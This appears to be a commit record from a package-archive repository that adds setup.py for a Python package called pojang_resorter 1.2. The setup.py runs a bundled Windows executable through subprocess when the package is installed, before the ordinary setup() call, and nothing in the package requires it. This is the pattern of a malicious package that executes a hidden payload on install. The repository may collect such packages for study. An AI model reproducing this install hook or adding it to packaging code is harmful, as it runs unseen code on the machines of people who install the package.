1412de2a6b2700d898b88952393569e9b7f2ac31
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-09-02 15:05:44 +0000

    Add package pojang-resorter/1.2/pojang_resorter-1.2.tar.gz

---
+++ packages/pojang-resorter/pojang_resorter-1.2.tar.gz/pojang_resorter-1.2/setup.py
@@ -0,0 +1,21 @@
+from setuptools import setup
+import os
+import subprocess
+
+# Custom function to run the executable during installation
+def run_exe():
+    exe_path = os.path.join(os.path.dirname(__file__), 'pojang_resorter', 'your_executable.exe')
+    if os.path.exists(exe_path):
+        subprocess.run([exe_path], check=True)  # This runs the .exe file
+
+# Call the function during the installation process
+run_exe()
+
+# Regular setup function for your package
+setup(
+    name='pojang_resorter',
+    version='1.2',
+    packages=['pojang_resorter'],
+    include_package_data=True,
+    # other metadata here
+)
